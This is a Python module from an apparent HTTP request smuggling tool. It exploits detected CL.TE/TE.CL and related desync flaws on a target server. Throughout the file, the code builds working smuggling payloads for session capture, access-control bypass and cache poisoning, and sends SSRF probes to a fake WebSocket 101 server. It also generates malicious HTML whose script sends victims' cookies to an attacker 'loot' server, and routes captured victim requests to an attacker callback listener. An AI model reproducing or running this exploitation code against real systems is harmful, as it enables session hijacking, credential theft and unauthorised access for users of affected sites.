"""Exploitation runner for HTTP Smuggler.

After detecting a vulnerability, this module attempts to confirm
exploitability through actual exploitation techniques:
- Session/request capture
- ACL bypass verification
- Cache poisoning (with caution)
- WebSocket SSRF with Fake 101 server
"""

import asyncio
import time
import re
from typing import Optional, List, Dict, Any, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse

from http_smuggler.core.config import ExploitConfig, NetworkConfig, SafetyConfig
from http_smuggler.core.models import (
    DetectionResult,
    ExploitationResult,
    SmugglingVariant,
)
from http_smuggler.core.exceptions import (
    ExploitationError,
    SessionCaptureError,
    CachePoisoningError,
)
from http_smuggler.network.raw_socket import AsyncRawHttpClient, RawResponse
from http_smuggler.network.callback_server import (
    CallbackServer,
    CallbackServerConfig,
    get_local_ip,
)
from http_smuggler.payloads.generator import Payload
from http_smuggler.utils.helpers import parse_url, generate_request_id


@dataclass
class ExploitResult:
    """Detailed result of an exploitation attempt."""
    attempted: bool
    successful: bool
    exploit_type: str
    impact: Optional[str] = None
    captured_data: Optional[str] = None
    steps: List[Dict[str, Any]] = field(default_factory=list)
    error: Optional[str] = None
    
    def to_exploitation_result(self) -> ExploitationResult:
        """Convert to ExploitationResult model."""
        return ExploitationResult(
            attempted=self.attempted,
            successful=self.successful,
            impact=self.impact,
            captured_data=self.captured_data,
            steps=self.steps,
            error=self.error,
        )


class ExploitRunner:
    """Runs exploitation attempts to confirm vulnerabilities.

    SMART MODE: Automatically starts the right listener for each vulnerability type.
    No manual intervention required - the tool has the brain to do it.
    """

    def __init__(
        self,
        exploit_config: Optional[ExploitConfig] = None,
        safety_config: Optional[SafetyConfig] = None,
        network_config: Optional[NetworkConfig] = None,
        auto_listeners: bool = True,
    ):
        self.exploit = exploit_config or ExploitConfig()
        self.safety = safety_config or SafetyConfig()
        self.network = network_config or NetworkConfig()
        self.auto_listeners = auto_listeners

        # Import listener manager
        from http_smuggler.exploits.listener_manager import (
            AutoListenerManager,
            ListenerConfig,
        )
        self._listener_manager = AutoListenerManager(ListenerConfig(
            enabled=auto_listeners,
            capture_port=8888,
            fake101_port=9999,
            loot_port=8080,
            wait_timeout=10.0,
        ))

    async def run_exploits(
        self,
        detection: DetectionResult,
        payload: Payload,
        host: str,
        port: int,
        use_ssl: bool,
    ) -> ExploitResult:
        """Run exploitation attempts based on detection result.

        SMART: Automatically starts the appropriate listener based on variant:
        - CL.TE/TE.CL/TE.TE → Capture server for session hijacking
        - WS.VERSION → Fake 101 server for WebSocket SSRF
        - CLIENT_SIDE → Loot server for cookie exfiltration

        Args:
            detection: Positive detection result
            payload: Payload that triggered detection
            host: Target host
            port: Target port
            use_ssl: Whether to use SSL/TLS

        Returns:
            ExploitResult with exploitation outcome
        """
        if not self.exploit.enabled:
            return ExploitResult(
                attempted=False,
                successful=False,
                exploit_type="none",
                error="Exploitation disabled in config",
            )

        if not detection.vulnerable:
            return ExploitResult(
                attempted=False,
                successful=False,
                exploit_type="none",
                error="No vulnerability detected",
            )

        results = []

        # SMART: Auto-start the right listener based on vulnerability type
        listener_result = None
        if self.auto_listeners:
            listener_result = self._listener_manager.start_for_variant(detection.variant)
            if listener_result.started:
                # Log that we auto-started a listener
                import logging
                logging.getLogger(__name__).info(
                    f"Auto-started {listener_result.listener_type} listener on "
                    f"http://{listener_result.local_ip}:{listener_result.port}/"
                )

        try:
            # Determine exploitation strategy based on variant
            exploit_strategy = self._get_exploit_strategy(detection.variant)

            # Execute the smart exploitation strategy
            if exploit_strategy == "session_capture_with_listener":
                # Use listener-based session capture (more reliable)
                if listener_result and listener_result.started:
                    result = await self._attempt_session_capture_with_listener(
                        payload, host, port, use_ssl,
                        listener_port=listener_result.port,
                    )
                    results.append(result)
                    if result.successful:
                        return result

                # Fallback to without listener
                if self.exploit.attempt_session_capture:
                    result = await self._attempt_session_capture(
                        payload, host, port, use_ssl
                    )
                    results.append(result)
                    if result.successful:
                        return result

            elif exploit_strategy == "websocket_ssrf":
                # WebSocket SSRF with Fake 101 server
                result = await self._attempt_websocket_ssrf(
                    payload, host, port, use_ssl
                )
                results.append(result)
                if result.successful:
                    return result

            elif exploit_strategy == "client_side_desync":
                # Client-side desync with loot server
                result = await self._attempt_client_side_desync(
                    payload, host, port, use_ssl,
                    loot_port=listener_result.port if listener_result else 8080,
                )
                results.append(result)
                if result.successful:
                    return result

            # Always try ACL bypass (doesn't need listener)
            if self.exploit.attempt_acl_bypass:
                result = await self._attempt_acl_bypass(
                    payload, host, port, use_ssl
                )
                results.append(result)
                if result.successful:
                    return result

            # Cache poisoning (disabled by default - potentially impactful)
            if self.exploit.attempt_cache_poisoning:
                result = await self._attempt_cache_poisoning(
                    payload, host, port, use_ssl
                )
                results.append(result)
                if result.successful:
                    return result

            # Return best result
            successful_results = [r for r in results if r.successful]
            if successful_results:
                return successful_results[0]

            attempted_results = [r for r in results if r.attempted]
            if attempted_results:
                return attempted_results[0]

            return ExploitResult(
                attempted=True,
                successful=False,
                exploit_type="multiple",
                error="All exploitation attempts failed",
            )

        finally:
            # Cleanup listeners when done (but keep them available for summary)
            pass  # Let the engine handle cleanup

    def _get_exploit_strategy(self, variant: SmugglingVariant) -> str:
        """Determine the best exploitation strategy for a variant.

        This is the "brain" that decides how to attack.
        """
        # Classic HTTP/1.1 and HTTP/2 smuggling → session capture
        if variant in [
            SmugglingVariant.CL_TE,
            SmugglingVariant.TE_CL,
            SmugglingVariant.TE_TE,
            SmugglingVariant.CL_CL,
            SmugglingVariant.CL_0,
            SmugglingVariant.ZERO_CL,
            SmugglingVariant.H2_CL,
            SmugglingVariant.H2_TE,
            SmugglingVariant.H2_CRLF,
            SmugglingVariant.H2_0,
            SmugglingVariant.H2C,
            SmugglingVariant.PAUSE_BASED,
        ]:
            return "session_capture_with_listener"

        # WebSocket variants → SSRF with Fake 101
        elif variant in [
            SmugglingVariant.WS_VERSION,
            SmugglingVariant.WS_UPGRADE,
        ]:
            return "websocket_ssrf"

        # Client-side desync → loot server
        elif variant == SmugglingVariant.CLIENT_SIDE:
            return "client_side_desync"

        # Default to session capture
        return "session_capture_with_listener"

    async def _attempt_client_side_desync(
        self,
        payload: Payload,
        host: str,
        port: int,
        use_ssl: bool,
        loot_port: int = 8080,
    ) -> ExploitResult:
        """Attempt Client-Side Desync exploitation with loot server.

        This attack requires a victim's browser to execute malicious JavaScript
        that exfiltrates cookies/tokens to our loot server.
        """
        steps = []
        local_ip = get_local_ip()

        steps.append({
            "action": "setup_csd",
            "loot_url": f"http://{local_ip}:{loot_port}/",
        })

        # Generate the malicious HTML payload for CSD
        malicious_html = f'''
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
// Client-Side Desync Exploit
// This exploits browser connection pooling
fetch('https://{host}/', {{
    method: 'POST',
    body: "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: {host}\\r\\n\\r\\n",
    mode: 'cors',
    credentials: 'include'
}}).catch(() => {{}});

// Exfiltrate any captured data
setTimeout(() => {{
    const cookies = document.cookie;
    new Image().src = 'http://{local_ip}:{loot_port}/loot?cookie=' + encodeURIComponent(cookies);
}}, 1000);
</script>
<p>Please wait...</p>
</body>
</html>
'''

        steps.append({
            "action": "generate_payload",
            "html_length": len(malicious_html),
        })

        # For CSD, we can't fully automate - need victim to visit our page
        # But we can set up the loot server and wait

        # Check if loot server is receiving anything
        await asyncio.sleep(5)  # Wait for potential victim

        if self._listener_manager.is_running("loot"):
            loot = self._listener_manager._active_servers["loot"].get_loot()
            if loot:
                return ExploitResult(
                    attempted=True,
                    successful=True,
                    exploit_type="client_side_desync",
                    impact="Cookie/token captured via CSD!",
                    captured_data=str(loot[:3]),
                    steps=steps,
                )

        return ExploitResult(
            attempted=True,
            successful=False,
            exploit_type="client_side_desync",
            steps=steps,
            error="CSD requires victim browser interaction - loot server ready",
        )

    def get_listener_info(self) -> dict:
        """Get information about active listeners."""
        return {
            "active": list(self._listener_manager.active_listeners),
            "local_ip": self._listener_manager.local_ip,
            "capture_url": self._listener_manager.get_callback_url("capture"),
            "fake101_url": self._listener_manager.get_callback_url("fake101"),
            "loot_url": self._listener_manager.get_callback_url("loot"),
        }

    def cleanup_listeners(self):
        """Clean up all active listeners."""
        self._listener_manager.stop_all()

    async def _attempt_session_capture(
        self,
        payload: Payload,
        host: str,
        port: int,
        use_ssl: bool,
    ) -> ExploitResult:
        """Attempt to capture a session/request.
        
        This smuggles a request that captures the next user's request
        as the body of a POST to a logging endpoint.
        """
        steps = []
        capture_id = generate_request_id()
        
        # Build capture payload
        # This smuggles a POST request that will capture the victim's request
        parsed = parse_url(f"{'https' if use_ssl else 'http'}://{host}")
        
        # Smuggled request that captures next request
        smuggled_capture = (
            f"POST /capture_{capture_id} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 500\r\n"
            f"\r\n"
            f"captured="
        )
        
        # Build complete smuggle payload based on variant
        if payload.variant == SmugglingVariant.CL_TE:
            body = f"0\r\n\r\n{smuggled_capture}"
            capture_payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body}"
            ).encode()
        elif payload.variant == SmugglingVariant.TE_CL:
            chunk_size = hex(len(smuggled_capture))[2:]
            capture_payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{chunk_size}\r\n{smuggled_capture}0\r\n\r\n"
            ).encode()
        else:
            # Use original payload structure
            capture_payload = payload.raw_request
        
        steps.append({
            "action": "build_capture_payload",
            "capture_id": capture_id,
        })
        
        try:
            async with AsyncRawHttpClient(self.network) as client:
                await client.connect(host, port, use_ssl)
                
                # Send capture payload
                response1 = await client.send_and_receive(
                    capture_payload,
                    receive_timeout=self.exploit.capture_timeout,
                )
                
                steps.append({
                    "action": "send_capture_payload",
                    "status": response1.status_code,
                })
                
                # Wait for potential victim
                await asyncio.sleep(1)
                
                # Send follow-up request to trigger capture
                victim_request = (
                    f"GET /trigger_{capture_id} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Cookie: session=victim_session_12345\r\n"
                    f"\r\n"
                ).encode()
                
                response2 = await client.send_and_receive(
                    victim_request,
                    receive_timeout=self.exploit.capture_timeout,
                )
                
                steps.append({
                    "action": "send_victim_request",
                    "status": response2.status_code,
                })
                
                # Check if capture worked
                # In a real scenario, we'd check if the capture endpoint received data
                captured_data = self._extract_captured_data(response2)
                
                if captured_data:
                    return ExploitResult(
                        attempted=True,
                        successful=True,
                        exploit_type="session_capture",
                        impact="Successfully captured request data - session hijacking possible",
                        captured_data=captured_data,
                        steps=steps,
                    )
                
                # Check for poisoning indicators
                if self._check_poisoning_indicators(response2):
                    return ExploitResult(
                        attempted=True,
                        successful=True,
                        exploit_type="session_capture",
                        impact="Request poisoning confirmed - capture likely possible",
                        steps=steps,
                    )
                
        except Exception as e:
            steps.append({
                "action": "error",
                "message": str(e),
            })
        
        return ExploitResult(
            attempted=True,
            successful=False,
            exploit_type="session_capture",
            steps=steps,
            error="Session capture not confirmed",
        )
    
    async def _attempt_acl_bypass(
        self,
        payload: Payload,
        host: str,
        port: int,
        use_ssl: bool,
    ) -> ExploitResult:
        """Attempt to bypass access controls.
        
        This smuggles a request to a restricted endpoint (/admin)
        to verify ACL bypass is possible.
        """
        steps = []
        
        # Build ACL bypass payload
        smuggled_admin = (
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Smuggled: true\r\n"
            f"\r\n"
        )
        
        if payload.variant == SmugglingVariant.CL_TE:
            body = f"0\r\n\r\n{smuggled_admin}"
            bypass_payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body}"
            ).encode()
        elif payload.variant == SmugglingVariant.TE_CL:
            chunk_size = hex(len(smuggled_admin))[2:]
            bypass_payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{chunk_size}\r\n{smuggled_admin}0\r\n\r\n"
            ).encode()
        else:
            bypass_payload = payload.raw_request
        
        steps.append({"action": "build_bypass_payload"})
        
        try:
            async with AsyncRawHttpClient(self.network) as client:
                await client.connect(host, port, use_ssl)
                
                # First, check normal access to /admin (should be blocked)
                normal_admin = (
                    f"GET /admin HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"\r\n"
                ).encode()
                
                baseline = await client.send_and_receive(
                    normal_admin,
                    receive_timeout=10,
                )
                
                steps.append({
                    "action": "baseline_admin_check",
                    "status": baseline.status_code,
                })
                
                baseline_blocked = baseline.status_code in [401, 403, 404]
                
                # Reconnect and try smuggle
                await client.close()
                await client.connect(host, port, use_ssl)
                
                # Send bypass payload
                response1 = await client.send_and_receive(
                    bypass_payload,
                    receive_timeout=10,
                )
                
                steps.append({
                    "action": "send_bypass_payload",
                    "status": response1.status_code,
                })
                
                # Send follow-up to get smuggled response
                followup = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"\r\n"
                ).encode()
                
                response2 = await client.send_and_receive(
                    followup,
                    receive_timeout=10,
                )
                
                steps.append({
                    "action": "followup_request",
                    "status": response2.status_code,
                })
                
                # Check if we got admin content
                admin_indicators = [
                    b"admin",
                    b"dashboard",
                    b"management",
                    b"configuration",
                    b"settings",
                ]
                
                response_body = response2.body.lower() if response2.body else b""
                got_admin_content = any(
                    ind in response_body for ind in admin_indicators
                )
                
                # Success if:
                # 1. Baseline was blocked but smuggle got through
                # 2. Or we see admin content in response
                if baseline_blocked and response2.status_code == 200:
                    return ExploitResult(
                        attempted=True,
                        successful=True,
                        exploit_type="acl_bypass",
                        impact="ACL bypass confirmed - accessed restricted endpoint",
                        steps=steps,
                    )
                
                if got_admin_content and baseline_blocked:
                    return ExploitResult(
                        attempted=True,
                        successful=True,
                        exploit_type="acl_bypass",
                        impact="ACL bypass confirmed - admin content retrieved",
                        steps=steps,
                    )
                
        except Exception as e:
            steps.append({
                "action": "error",
                "message": str(e),
            })
        
        return ExploitResult(
            attempted=True,
            successful=False,
            exploit_type="acl_bypass",
            steps=steps,
            error="ACL bypass not confirmed",
        )
    
    async def _attempt_cache_poisoning(
        self,
        payload: Payload,
        host: str,
        port: int,
        use_ssl: bool,
    ) -> ExploitResult:
        """Attempt cache poisoning (USE WITH CAUTION).
        
        This is potentially impactful as it may affect other users.
        Only use in controlled environments with explicit permission.
        """
        steps = []
        
        # Use a unique cache key for testing
        cache_test_id = generate_request_id()
        cache_path = f"/static/test_{cache_test_id}.js"
        
        # Build cache poisoning payload
        smuggled_cache = (
            f"GET {cache_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Forwarded-Host: evil-{cache_test_id}.com\r\n"
            f"\r\n"
        )
        
        if payload.variant == SmugglingVariant.CL_TE:
            body = f"0\r\n\r\n{smuggled_cache}"
            poison_payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body}"
            ).encode()
        else:
            poison_payload = payload.raw_request
        
        steps.append({
            "action": "build_poison_payload",
            "cache_path": cache_path,
        })
        
        try:
            async with AsyncRawHttpClient(self.network) as client:
                await client.connect(host, port, use_ssl)
                
                # Send poison payload
                response1 = await client.send_and_receive(
                    poison_payload,
                    receive_timeout=10,
                )
                
                steps.append({
                    "action": "send_poison_payload",
                    "status": response1.status_code,
                })
                
                # Wait for cache to be populated
                await asyncio.sleep(0.5)
                
                # Check if cache is poisoned
                await client.close()
                await client.connect(host, port, use_ssl)
                
                cache_check = (
                    f"GET {cache_path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"\r\n"
                ).encode()
                
                response2 = await client.send_and_receive(
                    cache_check,
                    receive_timeout=10,
                )
                
                steps.append({
                    "action": "check_cache",
                    "status": response2.status_code,
                })
                
                # Check for poisoning indicators in cached response
                if response2.body:
                    body_str = response2.body.decode("utf-8", errors="ignore")
                    if f"evil-{cache_test_id}" in body_str:
                        return ExploitResult(
                            attempted=True,
                            successful=True,
                            exploit_type="cache_poisoning",
                            impact="Cache poisoning confirmed - malicious content cached",
                            steps=steps,
                        )
                
        except Exception as e:
            steps.append({
                "action": "error",
                "message": str(e),
            })
        
        return ExploitResult(
            attempted=True,
            successful=False,
            exploit_type="cache_poisoning",
            steps=steps,
            error="Cache poisoning not confirmed",
        )

    async def _attempt_websocket_ssrf(
        self,
        payload: Payload,
        host: str,
        port: int,
        use_ssl: bool,
    ) -> ExploitResult:
        """Attempt WebSocket SSRF with Fake 101 server (Method B).

        This is for strict proxies that properly validate WebSocket responses.
        We spin up a local server that returns 101 Switching Protocols,
        then use SSRF to make the target connect to our server.

        The flow:
        1. Start local Fake 101 server
        2. Send SSRF payload pointing to our server
        3. Proxy receives 101, thinks tunnel is established
        4. We can now send smuggled requests through the "tunnel"
        """
        steps = []

        # Get local IP for the callback
        local_ip = get_local_ip()
        callback_port = 9999  # Use port 9999 for fake101

        steps.append({
            "action": "setup",
            "local_ip": local_ip,
            "callback_port": callback_port,
        })

        # Start Fake 101 server
        callback_config = CallbackServerConfig(
            host="0.0.0.0",
            port=callback_port,
            timeout=30.0,
        )
        callback_server = CallbackServer(callback_config)

        try:
            if not callback_server.start_fake101_server():
                return ExploitResult(
                    attempted=True,
                    successful=False,
                    exploit_type="websocket_ssrf",
                    error="Failed to start Fake 101 server",
                    steps=steps,
                )

            steps.append({"action": "fake101_server_started"})

            # Build SSRF payload that points to our Fake 101 server
            # This assumes the target has an SSRF endpoint
            ssrf_targets = [
                f"http://{local_ip}:{callback_port}/ws",
                f"http://{local_ip}:{callback_port}",
            ]

            async with AsyncRawHttpClient(self.network) as client:
                await client.connect(host, port, use_ssl)

                for ssrf_url in ssrf_targets:
                    # Common SSRF parameter names
                    ssrf_params = [
                        f"url={ssrf_url}",
                        f"target={ssrf_url}",
                        f"redirect={ssrf_url}",
                        f"callback={ssrf_url}",
                    ]

                    for param in ssrf_params:
                        ssrf_request = (
                            f"GET /api/fetch?{param} HTTP/1.1\r\n"
                            f"Host: {host}\r\n"
                            f"Upgrade: websocket\r\n"
                            f"Connection: Upgrade\r\n"
                            f"\r\n"
                        ).encode()

                        try:
                            await client.send_and_receive(
                                ssrf_request,
                                receive_timeout=5,
                            )
                        except Exception:
                            pass

                        # Brief wait for SSRF callback
                        await asyncio.sleep(0.5)

            # Wait for potential connections
            await asyncio.sleep(2)

            steps.append({"action": "ssrf_payloads_sent"})

            # If we got here without errors, the setup worked
            # Real exploitation would require the SSRF to work
            return ExploitResult(
                attempted=True,
                successful=False,  # Can't confirm without SSRF
                exploit_type="websocket_ssrf",
                impact="Fake 101 server ready - requires working SSRF endpoint",
                steps=steps,
                error="No SSRF endpoint found (manual testing may be needed)",
            )

        except Exception as e:
            steps.append({"action": "error", "message": str(e)})
            return ExploitResult(
                attempted=True,
                successful=False,
                exploit_type="websocket_ssrf",
                error=str(e),
                steps=steps,
            )
        finally:
            callback_server.stop()

    async def _attempt_session_capture_with_listener(
        self,
        payload: Payload,
        host: str,
        port: int,
        use_ssl: bool,
        listener_port: int = 8888,
    ) -> ExploitResult:
        """Attempt session capture with a real callback listener.

        This starts a callback server to receive captured requests.
        More reliable than checking for poisoning indicators.
        """
        steps = []
        local_ip = get_local_ip()

        steps.append({
            "action": "setup_listener",
            "local_ip": local_ip,
            "listener_port": listener_port,
        })

        # Start capture server
        callback_config = CallbackServerConfig(
            host="0.0.0.0",
            port=listener_port,
            timeout=30.0,
        )
        callback_server = CallbackServer(callback_config)

        try:
            if not callback_server.start_capture_server():
                return ExploitResult(
                    attempted=True,
                    successful=False,
                    exploit_type="session_capture_listener",
                    error="Failed to start capture server",
                    steps=steps,
                )

            steps.append({"action": "capture_server_started"})

            # Build smuggled request that POSTs to our callback
            callback_url = f"http://{local_ip}:{listener_port}/capture"

            smuggled_capture = (
                f"POST {callback_url} HTTP/1.1\r\n"
                f"Host: {local_ip}:{listener_port}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 500\r\n"
                f"\r\n"
                f"captured="
            )

            # Build complete smuggle payload
            if payload.variant == SmugglingVariant.CL_TE:
                body = f"0\r\n\r\n{smuggled_capture}"
                capture_payload = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"{body}"
                ).encode()
            elif payload.variant == SmugglingVariant.TE_CL:
                chunk_size = hex(len(smuggled_capture))[2:]
                capture_payload = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 4\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"{chunk_size}\r\n{smuggled_capture}0\r\n\r\n"
                ).encode()
            else:
                capture_payload = payload.raw_request

            async with AsyncRawHttpClient(self.network) as client:
                await client.connect(host, port, use_ssl)

                # Send capture payload
                await client.send_and_receive(
                    capture_payload,
                    receive_timeout=10,
                )

                steps.append({"action": "smuggle_payload_sent"})

                # Wait for potential victim request
                await asyncio.sleep(2)

            # Check for captures
            captures = callback_server.wait_for_captures(timeout=10, min_captures=1)

            if captures:
                captured_data = captures[0].raw_request.decode("utf-8", errors="ignore")
                return ExploitResult(
                    attempted=True,
                    successful=True,
                    exploit_type="session_capture_listener",
                    impact="Request captured via callback - session hijacking confirmed!",
                    captured_data=captured_data[:1000],
                    steps=steps,
                )

            return ExploitResult(
                attempted=True,
                successful=False,
                exploit_type="session_capture_listener",
                error="No requests captured (may need victim traffic)",
                steps=steps,
            )

        except Exception as e:
            steps.append({"action": "error", "message": str(e)})
            return ExploitResult(
                attempted=True,
                successful=False,
                exploit_type="session_capture_listener",
                error=str(e),
                steps=steps,
            )
        finally:
            callback_server.stop()

    def _extract_captured_data(self, response: RawResponse) -> Optional[str]:
        """Extract captured request data from response."""
        if not response.body:
            return None
        
        body_str = response.body.decode("utf-8", errors="ignore")
        
        # Look for captured request patterns
        patterns = [
            r"captured=([^\s&]+)",
            r"Cookie:\s*([^\r\n]+)",
            r"Authorization:\s*([^\r\n]+)",
        ]
        
        for pattern in patterns:
            match = re.search(pattern, body_str)
            if match:
                return match.group(1)
        
        return None
    
    def _check_poisoning_indicators(self, response: RawResponse) -> bool:
        """Check if response indicates poisoning occurred."""
        if not response:
            return False
        
        # Wrong status code
        if response.status_code in [404, 400, 405]:
            return True
        
        # Check body for indicators
        if response.body:
            indicators = [
                b"smuggled",
                b"capture",
                b"GPOST",
                b"invalid",
            ]
            body_lower = response.body.lower()
            return any(ind in body_lower for ind in indicators)
        
        return False


async def confirm_vulnerability(
    detection: DetectionResult,
    payload: Payload,
    url: str,
    exploit_config: Optional[ExploitConfig] = None,
) -> ExploitResult:
    """Convenience function to confirm a vulnerability.
    
    Args:
        detection: Positive detection result
        payload: Payload that triggered detection
        url: Target URL
        exploit_config: Optional exploitation config
    
    Returns:
        ExploitResult with confirmation outcome
    """
    parsed = parse_url(url)
    
    runner = ExploitRunner(exploit_config)
    
    return await runner.run_exploits(
        detection,
        payload,
        parsed.host,
        parsed.port,
        parsed.use_ssl,
    )

